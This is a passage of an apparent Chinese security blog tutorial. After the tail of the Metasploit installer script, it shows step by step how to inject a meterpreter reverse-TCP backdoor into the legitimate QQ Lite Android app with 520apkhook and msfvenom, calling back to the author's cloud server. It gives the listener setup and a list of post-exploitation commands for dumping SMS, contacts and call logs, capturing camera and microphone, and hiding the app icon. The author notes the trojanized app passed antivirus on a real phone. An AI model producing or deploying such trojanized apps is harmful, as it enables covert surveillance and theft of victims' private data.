class="string">Al1xL2oFCR98Zm0ACgkQzftfpSAHuVTPlg/9H++FCAMEoQxxWeQ1e7RkQbplrjmA</span></span><br><span class="line"><span class="string">+w1hqto1YnJDB3RFpvEubS45h/36Lgs1SmcgGx1dw2uzjSAtWS/4MWtvnyWXFV3K</span></span><br><span class="line"><span class="string">ZjhyJAlNw7bZLcrJHqpGFdVJvRuPmf6dYvPgSaqZQv0HP2fwSwu/msGJ8u1E7kDW</span></span><br><span class="line"><span class="string">KpTg5LeQlJ3F3eePSAIa47Y0H6AaNuiW1lUz4YTboRKfDRYQizfKKi/9ssqAXNI5</span></span><br><span class="line"><span class="string">eAPLhj9i3t/MVSGtV2G6xldEQLM7A0CI4twrIplyPlYt5tCxdA225cRclRYbqaQX</span></span><br><span class="line"><span class="string">AcE34YJWAWCgGxw98wxQZwtk8kXSwPdpMyrHadaAHiTzqPBlTrSes8sTDoJxfg8P</span></span><br><span class="line"><span class="string">k73ILgBIey4FD7US5V46MZrKtduFmL9OvqTvZl17r6xaoScrH4oK690VHmdkfM2P</span></span><br><span class="line"><span class="string">KOkgRU8PumlIjGvTDavm5afh6LkD75XDLPF5n9Om7F+Sc+2Ul+SPYV8kQaFHX1XD</span></span><br><span class="line"><span class="string">QuHBeJRT9VdO9T/SI2YHkCnatC50nr9V/gK2ecui+ri8gto29jaAmz7IhdNlMU9k</span></span><br><span class="line"><span class="string">EPfAbnG6Mu6DLlpjsTBYEyuAnmKVWvNBDlgC4d42WQMGleeSXCZzC0Wh3t9FbBOc</span></span><br><span class="line"><span class="string">3+OB1aEdUrx1dE0elWyrzUFHmd/EOCXpLSE4RYcN6TuCIkEI0TyXYmDRQWGofK0G</span></span><br><span class="line"><span class="string">S8CxmfmppfGI92C5Ag0EUMDL/QEQALkDKrnosJ5erN/ot2WiaM82KhI30J6+LZUL</span></span><br><span class="line"><span class="string">9sniuA1a16cfoQfwXTnFpcd48O41aT2BNp0jpGjDo49rRC8yB7HjCd1lM+wRRm/d</span></span><br><span class="line"><span class="string">0Et/4lBgycaa63jQtG+GK9gN+sf4LkiDgJYkXX2wEOilvZw9zU2VLTGhOUB+e7vR</span></span><br><span class="line"><span class="string">P2LpnA4nSkvUGNKvaWcF+k/jeyP2o7dorXumfXfjGBAYiWCF6hDiy8XT5G2ruMDD</span></span><br><span class="line"><span class="string">lWafoleGSVeuB0onijqzRU5BaN+IbMIzGWLRP6yvhYmmO1210IGZBF3/gJLR3OaU</span></span><br><span class="line"><span class="string">m82AV5Eg4FslzBViv620hDuVsEoeRne2uN/qiEtYjSLJWYn5trtApQkk/1i+OK6c</span></span><br><span class="line"><span class="string">/lqtT+CyQ/IS69E5+fJYkAYkCgHJBdcJmDXSHKycarDDihPSPuN131kgyt/wZLE9</span></span><br><span class="line"><span class="string">oV6eeH5ay9ruto9NYELNjmGVrZyZyAYRo6duN/ZyUBbczIaaWVCkEYgO04rwamkT</span></span><br><span class="line"><span class="string">wOdWGEzj24gNMcXYCKQyW2OrDN3odX3f1UDvsiZqX88o0fI5YQB2YhGBjAfH5wSP</span></span><br><span class="line"><span class="string">MkBBJCR3Qbc9J8ksFp//RWjWcFq/yr1WOCqEQVo1PMSPkeqfqV3ApS6XhVv4ChKL</span></span><br><span class="line"><span class="string">PlnV27fa6XUK1yjNQlNxYkv15tnxhtKrLs6XiyVJbe6Q1obq0FOpBhv2WIh291BQ</span></span><br><span class="line"><span class="string">bqgmGbNvABEBAAGJAjwEGAEIACYCGwwWIQQJ5V+vT3hizW1ViZfN+1+lIAe5VAUC</span></span><br><span class="line"><span class="string">XXEvjgUJH3xmkQAKCRDN+1+lIAe5VJueD/4+6ldtpXYin+lWcMyHM8487GczLi8S</span></span><br><span class="line"><span class="string">XgxZJu/2GzEpgdke8xoQWv6Jsk2AQaPLciIT7yU7/gTWsOiY7Om+4MGqZY+KqZ/X</span></span><br><span class="line"><span class="string">eI8nFsGQx2yI7TDUQasN4uB5y6RnMGSH8DbAIWydVP2XWNVCHcVNMbeAoW7IiOOh</span></span><br><span class="line"><span class="string">I2wT4bCmzrjfVsJRo8VvpykPhm7+svsU2ukMW0Ua77bA1gzdvPpRzN2I1MY/6lJk</span></span><br><span class="line"><span class="string">x7BwtYsiAZt0+jII31IdCNpz4BlU3eadG+QbEH/q5FrHPBtkRWmziJpKXZDWdAg/</span></span><br><span class="line"><span class="string">I7yim36xfxjMtcv8CI3YKmy5jYcGKguA2SGApQpPEUkafLZc62v8HVmZZFKmLyXR</span></span><br><span class="line"><span class="string">XM9YTHz4v4jhruJ80M6YjUtfQv0zDn2HoyZuPxAW4HCys1/9+iAhuFqdt1PnHBs/</span></span><br><span class="line"><span class="string">AmTFlQPAeMu++na4uc7vmnDwlY7RDPb0uctUczhEO4gT5UkLk5C9hcOKVAfmgF4n</span></span><br><span class="line"><span class="string">MNgnOoSZO2orPKh3mejj+VAZsr1kfEWMoFeHPrWdxgRmjOhUfy6hKhJ1H306aaSQ</span></span><br><span class="line"><span class="string">gkE3638Je/onWmnmZrDEZq7zg0Qk3aOOhJXugmRnIjH341y/whxvAdJIyXrjLN4z</span></span><br><span class="line"><span class="string">qCU0JkA1rVqS6PXZabKb9DOqYa4pr9thGS5rU+Gn3GWiSq2PtVW6Hh83WOFcEsMk</span></span><br><span class="line"><span class="string">2vTa24LE0J2DQg==</span></span><br><span class="line"><span class="string">=Qa/n</span></span><br><span class="line"><span class="string">-----END PGP PUBLIC KEY BLOCK-----</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">install_deb</span></span>() &#123;</span><br><span class="line">  LIST_FILE=/etc/apt/sources.list.d/metasploit-framework.list</span><br><span class="line">  PREF_FILE=/etc/apt/preferences.d/pin-metasploit.pref</span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;Adding metasploit-framework to your repository list..&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;deb <span class="variable">$DOWNLOAD_URI</span>/apt lucid main&quot;</span> &gt; <span class="variable">$LIST_FILE</span></span><br><span class="line">  print_pgp_key | apt-key add -</span><br><span class="line">  <span class="keyword">if</span> [ ! -f <span class="variable">$PREF_FILE</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">mkdir</span> -p /etc/apt/preferences.d/</span><br><span class="line">    <span class="built_in">cat</span> &gt; <span class="variable">$PREF_FILE</span> &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">Package: metasploit*</span></span><br><span class="line"><span class="string">Pin: origin downloads.metasploit.com</span></span><br><span class="line"><span class="string">Pin-Priority: 1000</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;Updating package cache..&quot;</span></span><br><span class="line">  apt-get update &gt; /dev/null</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;OK&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Checking for and installing update..&quot;</span></span><br><span class="line">  apt-get install -y --allow-downgrades metasploit-framework</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">install_rpm</span></span>() &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Checking for and installing update..&quot;</span></span><br><span class="line">  REPO_FILE=/etc/yum.repos.d/metasploit-framework.repo</span><br><span class="line">  GPG_KEY_FILE=/etc/pki/rpm-gpg/RPM-GPG-KEY-Metasploit</span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;Adding metasploit-framework to your repository list..&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">cat</span> &gt; /etc/yum.repos.d/metasploit-framework.repo &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[metasploit]</span></span><br><span class="line"><span class="string">name=Metasploit</span></span><br><span class="line"><span class="string">baseurl=$DOWNLOAD_URI/rpm</span></span><br><span class="line"><span class="string">gpgcheck=1</span></span><br><span class="line"><span class="string">gpgkey=file://$GPG_KEY_FILE</span></span><br><span class="line"><span class="string">enabled=1</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">  print_pgp_key &gt; <span class="variable">$&#123;GPG_KEY_FILE&#125;</span></span><br><span class="line">  yum install -y metasploit-framework</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">install_suse</span></span>() &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Checking for and installing update..&quot;</span></span><br><span class="line">  GPG_KEY_FILE_DIR=/etc/pki/rpm-gpg</span><br><span class="line">  GPG_KEY_FILE=<span class="variable">$&#123;GPG_KEY_FILE_DIR&#125;</span>/RPM-GPG-KEY-Metasploit</span><br><span class="line">  <span class="built_in">echo</span> -n <span class="string">&quot;Adding metasploit-framework to your repository list..&quot;</span></span><br><span class="line">  <span class="keyword">if</span> [ ! -d <span class="variable">$GPG_KEY_FILE_DIR</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">mkdir</span> -p <span class="variable">$GPG_KEY_FILE_DIR</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  zypper ar  -f <span class="variable">$DOWNLOAD_URI</span>/rpm metasploit</span><br><span class="line">  print_pgp_key &gt; <span class="variable">$&#123;GPG_KEY_FILE&#125;</span></span><br><span class="line">  rpmkeys --import <span class="variable">$&#123;GPG_KEY_FILE&#125;</span></span><br><span class="line">  zypper install -y metasploit-framework</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">install_pkg</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">  (</span><br><span class="line">    <span class="built_in">cd</span> ~/Downloads</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Downloading package...&quot;</span></span><br><span class="line">    curl -O <span class="string">&quot;<span class="variable">$DOWNLOAD_URI</span>/osx/metasploitframework-latest.pkg&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Checking signature...&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> pkgutil --check-signature metasploitframework-latest.pkg; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;Installing package...&quot;</span></span><br><span class="line">      installer -pkg metasploitframework-latest.pkg -target /</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Cleaning up...&quot;</span></span><br><span class="line">    <span class="built_in">rm</span> -fv metasploitframework-latest.pkg</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DOWNLOAD_URI=http://downloads.metasploit.com/data/releases/metasploit-framework</span><br><span class="line">PKGTYPE=unknown</span><br><span class="line">ID=`<span class="built_in">id</span> -u`</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f /etc/redhat-release ] ; <span class="keyword">then</span></span><br><span class="line">  PKGTYPE=rpm</span><br><span class="line"><span class="keyword">elif</span> [ -f /etc/system-release ] ; <span class="keyword">then</span></span><br><span class="line">  <span class="comment"># If /etc/system-release is present, this is likely a distro that uses RPM.</span></span><br><span class="line">  PKGTYPE=rpm</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">uname</span> -sv | grep <span class="string">&#x27;Darwin&#x27;</span> &gt; /dev/null; <span class="keyword">then</span></span><br><span class="line">    PKGTYPE=pkg</span><br><span class="line">  <span class="keyword">elif</span> [ -f /usr/bin/zypper ] ; <span class="keyword">then</span></span><br><span class="line">    PKGTYPE=sus</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    PKGTYPE=deb</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$ID</span>&quot;</span> -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> ! <span class="built_in">hash</span> sudo 2&gt;/dev/null; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;This script must be executed as the &#x27;root&#x27; user or with sudo&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Switching to root user to update the package&quot;</span></span><br><span class="line">    sudo -E <span class="variable">$0</span> <span class="variable">$@</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$PKGTYPE</span> <span class="keyword">in</span></span><br><span class="line">  deb)</span><br><span class="line">    install_deb</span><br><span class="line">    ;;</span><br><span class="line">  sus)</span><br><span class="line">    install_suse</span><br><span class="line">    ;;</span><br><span class="line">  rpm)</span><br><span class="line">    install_rpm</span><br><span class="line">    ;;</span><br><span class="line">  *)</span><br><span class="line">    install_pkg</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><p>我这里是保存为了<code>msf</code>文件，在运行之前一定要记得赋予执行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> +x msf</span><br><span class="line">sudo ./msf</span><br></pre></td></tr></table></figure><p>然后就会开始安装，安装完成后输入<code>msfconsole</code>看看能不能正常打开，如果可以就是安装成功了</p><p>（附上以上正常运行的图）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-5/Xshell-20220607-230127.png?download=true"></p><h2 id="用520apkhook创建带有后门的apk文件"><a href="#用520apkhook创建带有后门的apk文件" class="headerlink" title="用520apkhook创建带有后门的apk文件"></a>用520apkhook创建带有后门的apk文件</h2><p>MSF自身本来就可以创建带有后门的APK程序，不过就是一个简单的<code>MainActivity</code>，我们还要把它压进我们的程序里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=&lt;host&gt; LPORT=5555 R &gt; pentestlab.apk</span><br></pre></td></tr></table></figure><p>这个比较麻烦（有时间再补），所以我这里用Github上别人写好的脚本</p><!-- [实用教程：手动安卓应用中注入msf后门 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/27666919) --><p>这里我选用的是QQ轻聊版（name&#x3D;’com.tencent.qqlite’ versionCode&#x3D;’174’ versionName&#x3D;’3.5.0’）</p><p>首先我们要把520apkhook给clone下来才能用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ba0gu0/520apkhook.git</span><br></pre></td></tr></table></figure><p>而且用之前，我们需要安装520apkhook需要的python轮子</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install rich pycryptodome</span><br></pre></td></tr></table></figure><p>安装完后，我们使用下面的命令格式进行apk的后门注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 main.py [-h] --lhost LHOST --lport LPORT [-m MODE] [-p PAYLOAD] -n NORMALAPK</span><br></pre></td></tr></table></figure><p>我这里把QQ轻聊版命名为<code>QQLite.apk</code>，我的服务器地址是我的腾讯云地址，端口开在了5555，那我就可以用下面的命令生成apk</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 main.py --lhost &lt;我的腾讯云IP&gt; --lport 5555 -n QQLite.apk</span><br></pre></td></tr></table></figure><p>然后程序就会自动开始打包，最后会告诉我们打包完成的文件位置</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-5/vmware-20220607-231140.png?download=true"></p><p>然后我们安装打包好的apk，我用我的手机测试了并没有报毒（红米K40 MIUI13），不过后来我还是选择在模拟器上安装，安装完后显示为正常的QQ轻聊版，而且能够正常使用</p><p><strong>但是并不是所有的应用都可以被注入，新版的微信就不可以（自动模式找不到入口smali）</strong></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-5/HD-Player-20220607-231533.png?download=true"></p><h2 id="在云服务器上创建监听器"><a href="#在云服务器上创建监听器" class="headerlink" title="在云服务器上创建监听器"></a>在云服务器上创建监听器</h2><p>这个创建监听器的命令其实在520apkhook的文件夹里面已经给我们写好了，log里面有一行写道</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[!] 生成的Msf Handler在: /home/gamernotitle/CTF/520apkhook/WorkDir/handler.rc</span><br></pre></td></tr></table></figure><p>也就是说<code>handler.rc</code>文件已经为我们写好了在msfconsole里面运行的命令</p><p>我们可以通过msfconsole自带的命令加载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -r handler.rc</span><br></pre></td></tr></table></figure><p>也可以打开<code>handler.rc</code>并复制里面的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload android/meterpreter/reverse_tcp</span><br><span class="line">set AutoLoadStdapi true</span><br><span class="line">set LHOST 0.0.0.0</span><br><span class="line">set LPORT 5555</span><br><span class="line">set exitonsession false</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure><p>然后粘贴在你的msfconsole里面</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-5/Xshell-20220607-231853.png?download=true"></p><p>这样就算是运行了，然后我们打开安装的软件，我们的msfconsole会提示肉鸡上线</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-5/Xshell-20220607-231955.png?download=true"></p><p>这时可以用<code>sessions</code>命令查看在线的肉鸡</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-5/Xshell-20220607-232045.png?download=true"></p><p>用<code>session -i &lt;id&gt;</code>就可以控制肉鸡啦</p><p>我这里就可以用<code>session -i 1</code>来通过第一个端口控制模拟器，使用<code>screenshot</code>命令进行截图</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-5/KOsQYAQc.jpeg"></p><h2 id="MSF-session-命令列表"><a href="#MSF-session-命令列表" class="headerlink" title="MSF session 命令列表"></a>MSF session 命令列表</h2><p>我自己常用的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">app_list# 列出所有的app，可以配合app_run使用</span><br><span class="line">app_run &lt;Package&gt;# 运行一个APP（会在目标设备直接运行，就类似用着用着突然打开了软件）</span><br><span class="line">webcam_list# 列出设备拥有的摄像头</span><br><span class="line">webcam_snap -i &lt;id&gt;# 通过指定摄像头拍照并保存（需要摄像头权限）</span><br><span class="line">upload &lt;src1&gt; &lt;src2&gt; ... &lt;dst&gt; # 上传本地文件到指定位置</span><br><span class="line">app_install &lt;path&gt;# 通过指定路径安装apk</span><br><span class="line">check_root# 检查设备是否已经root</span><br><span class="line">shell# 返回一个shell会话，如果目标已经root，可以用su提权</span><br><span class="line">dump_calllog# 储存设备的通话记录（需要读取通话记录权限）</span><br><span class="line">dump_sms# 储存设备的短信（需要读取短信权限）</span><br><span class="line">dump_contacts# 储存设备的联系人列表（需要读取通讯录权限）</span><br><span class="line">screenshare# 实时观看设备的屏幕</span><br><span class="line">screenshot# 屏幕截图（出了寄生的软件后就截不到了）</span><br><span class="line">record_mic# 录音</span><br><span class="line">portfwd# 开放端口</span><br><span class="line">download &lt;path&gt;# 下载目标机器上的文件</span><br><span class="line">ls# 经典命令，显示当前目录下的文件（需要存储权限）</span><br></pre></td></tr></table></figure><p>官方全命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                Backgrounds the current session</span><br><span class="line">    bg                        Alias for background</span><br><span class="line">    bgkill                    Kills a background meterpreter script</span><br><span class="line">    bglist                    Lists running background scripts</span><br><span class="line">    bgrun                     Executes a meterpreter script as a background thread</span><br><span class="line">    channel                   Displays information or control active channels</span><br><span class="line">    close                     Closes a channel</span><br><span class="line">    detach                    Detach the meterpreter session (for http/https)</span><br><span class="line">    disable_unicode_encoding  Disables encoding of unicode strings</span><br><span class="line">    enable_unicode_encoding   Enables encoding of unicode strings</span><br><span class="line">    exit                      Terminate the meterpreter session</span><br><span class="line">    get_timeouts              Get the current session timeout values</span><br><span class="line">    guid                      Get the session GUID</span><br><span class="line">    help                      Help menu</span><br><span class="line">    info                      Displays information about a Post module</span><br><span class="line">    irb                       Open an interactive Ruby shell on the current session</span><br><span class="line">    load                      Load one or more meterpreter extensions</span><br><span class="line">    machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">    pry                       Open the Pry debugger on the current session</span><br><span class="line">    quit                      Terminate the meterpreter session</span><br><span class="line">    read                      Reads data from a channel</span><br><span class="line">    resource                  Run the commands stored in a file</span><br><span class="line">    run                       Executes a meterpreter script or Post module</span><br><span class="line">    secure                    (Re)Negotiate TLV packet encryption on the session</span><br><span class="line">    sessions                  Quickly switch to another session</span><br><span class="line">    set_timeouts              Set the current session timeout values</span><br><span class="line">    sleep                     Force Meterpreter to go quiet, then re-establish session</span><br><span class="line">    transport                 Manage the transport mechanisms</span><br><span class="line">    use                       Deprecated alias for &quot;load&quot;</span><br><span class="line">    uuid                      Get the UUID for the current session</span><br><span class="line">    write                     Writes data to a channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: File system Commands</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    cat           Read the contents of a file to the screen</span><br><span class="line">    cd            Change directory</span><br><span class="line">    checksum      Retrieve the checksum of a file</span><br><span class="line">    cp            Copy source to destination</span><br><span class="line">    del           Delete the specified file</span><br><span class="line">    dir           List files (alias for ls)</span><br><span class="line">    download      Download a file or directory</span><br><span class="line">    edit          Edit a file</span><br><span class="line">    getlwd        Print local working directory</span><br><span class="line">    getwd         Print working directory</span><br><span class="line">    lcat          Read the contents of a local file to the screen</span><br><span class="line">    lcd           Change local working directory</span><br><span class="line">    lls           List local files</span><br><span class="line">    lpwd          Print local working directory</span><br><span class="line">    ls            List files</span><br><span class="line">    mkdir         Make directory</span><br><span class="line">    mv            Move source to destination</span><br><span class="line">    pwd           Print working directory</span><br><span class="line">    rm            Delete the specified file</span><br><span class="line">    rmdir         Remove directory</span><br><span class="line">    search        Search for files</span><br><span class="line">    upload        Upload a file or directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Networking Commands</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    ifconfig      Display interfaces</span><br><span class="line">    ipconfig      Display interfaces</span><br><span class="line">    portfwd       Forward a local port to a remote service</span><br><span class="line">    route         View and modify the routing table</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: System Commands</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    execute       Execute a command</span><br><span class="line">    getenv        Get one or more environment variable values</span><br><span class="line">    getpid        Get the current process identifier</span><br><span class="line">    getuid        Get the user that the server is running as</span><br><span class="line">    localtime     Displays the target system local date and time</span><br><span class="line">    pgrep         Filter processes by name</span><br><span class="line">    ps            List running processes</span><br><span class="line">    shell         Drop into a system command shell</span><br><span class="line">    sysinfo       Gets information about the remote system, such as OS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: User interface Commands</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    screenshare   Watch the remote user desktop in real time</span><br><span class="line">    screenshot    Grab a screenshot of the interactive desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Webcam Commands</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">    Command        Description</span><br><span class="line">    -------        -----------</span><br><span class="line">    record_mic     Record audio from the default microphone for X seconds</span><br><span class="line">    webcam_chat    Start a video chat</span><br><span class="line">    webcam_list    List webcams</span><br><span class="line">    webcam_snap    Take a snapshot from the specified webcam</span><br><span class="line">    webcam_stream  Play a video stream from the specified webcam</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Audio Output Commands</span><br><span class="line">=============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    play          play a waveform audio file (.wav) on the target system</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Android Commands</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    activity_start    Start an Android activity from a Uri string</span><br><span class="line">    check_root        Check if device is rooted</span><br><span class="line">    dump_calllog      Get call log</span><br><span class="line">    dump_contacts     Get contacts list</span><br><span class="line">    dump_sms          Get sms messages</span><br><span class="line">    geolocate         Get current lat-long using geolocation</span><br><span class="line">    hide_app_icon     Hide the app icon from the launcher</span><br><span class="line">    interval_collect  Manage interval collection capabilities</span><br><span class="line">    send_sms          Sends SMS from target session</span><br><span 